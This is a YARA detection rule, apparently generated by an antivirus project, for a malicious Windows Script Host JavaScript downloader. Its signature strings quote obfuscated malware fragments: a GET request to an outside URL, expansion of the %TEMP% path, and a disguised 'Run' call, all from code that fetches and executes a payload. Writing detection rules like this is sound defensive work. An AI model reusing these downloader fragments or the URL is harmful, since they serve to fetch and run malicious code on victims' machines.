rule sig_20160428_f8d0a527f8d962ff08751e8b1680d338 {
  meta:
    description = "datamaliciousorder - file 20160428_f8d0a527f8d962ff08751e8b1680d338.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3f3f46aeda15f9ef754c49600b7c92023c74a0e9f23165020ab19e6c37701ded"

  strings:
    $s1  = "FmnQgwOhbQoqJdlTvfAam[CyxXoiAlpFmlHzwAuiUre](\"G\" + \"ET\", \"http://rabitaforex.com/pw3ksl\", false);" fullword ascii
    $s2  = "function NiwAojSdkLurSypFybKzg() {return BpmTqbWlqNduWinAyrAbh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function EjsOpoJcjRuoNbaWzrEfb(OnvBkhCdiCubGlfAtwCwx){BpmTqbWlqNduWinAyrAbh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function EjsOpoJcjRuoNbaWzrEfb(OnvBkhCdiCubGlfAtwCwx){BpmTqbWlqNduWinAyrAbh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function EowEfoQhwXxjVntOblQer(MqpUxcZcxEofBfgDrkYly, DgzKuzHvtWyvVwuGmcNwt){HohWqiTvoVqyUzmXxoLmx = HohWqiTvoVqyUzmXxoLmx * 1; " ascii
    $s6  = "return MqpUxcZcxEofBfgDrkYly - DgzKuzHvtWyvVwuGmcNwt;};" fullword ascii
    $s7  = "var BpmTqbWlqNduWinAyrAbh = function HiuDkrYzuJngBnlNoxGmb() {return PswKxeUtaGelKmdCgcKzx[IelKrhRuvJrbHpiZmiUej](\"WScript\"+\"" ascii
    $s8  = "var BpmTqbWlqNduWinAyrAbh = function HiuDkrYzuJngBnlNoxGmb() {return PswKxeUtaGelKmdCgcKzx[IelKrhRuvJrbHpiZmiUej](\"WScript\"+\"" ascii
    $s9  = "var PswKxeUtaGelKmdCgcKzx = this[\"WScript\"];" fullword ascii
    $s10 = "function NiwAojSdkLurSypFybKzg() {return BpmTqbWlqNduWinAyrAbh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (FmnQgwOhbQoqJdlTvfAam[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function BcfGglLrwJchVqkSyzOda(){return YkyEnqXltHorLgvFmuIaw + \"\";};" fullword ascii
    $s13 = "function EowEfoQhwXxjVntOblQer(MqpUxcZcxEofBfgDrkYly, DgzKuzHvtWyvVwuGmcNwt){HohWqiTvoVqyUzmXxoLmx = HohWqiTvoVqyUzmXxoLmx * 1; " ascii
    $s14 = "function IqsArfQnsJakYepKtrYvn() {return ((ExqOcmNosJxzAqxGffJcg == true) && (ExqOcmNosJxzAqxGffJcg == YnxKuvZowYgpBakNkaHyh)) ?" ascii
    $s15 = "function IqsArfQnsJakYepKtrYvn() {return ((ExqOcmNosJxzAqxGffJcg == true) && (ExqOcmNosJxzAqxGffJcg == YnxKuvZowYgpBakNkaHyh)) ?" ascii
    $s16 = "var ExqOcmNosJxzAqxGffJcg = false;" fullword ascii
    $s17 = "ExqOcmNosJxzAqxGffJcg = true; " fullword ascii
    $s18 = "function SgxDniLttQfbZrlBorYoj(){return 23;};" fullword ascii
    $s19 = "WzqEylBrxLtqWteIiqPdr = true;" fullword ascii
    $s20 = "function IfjJjsVpnXzlSyfRpvBen(){return IelKrhRuvJrbHpiZmiUej;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}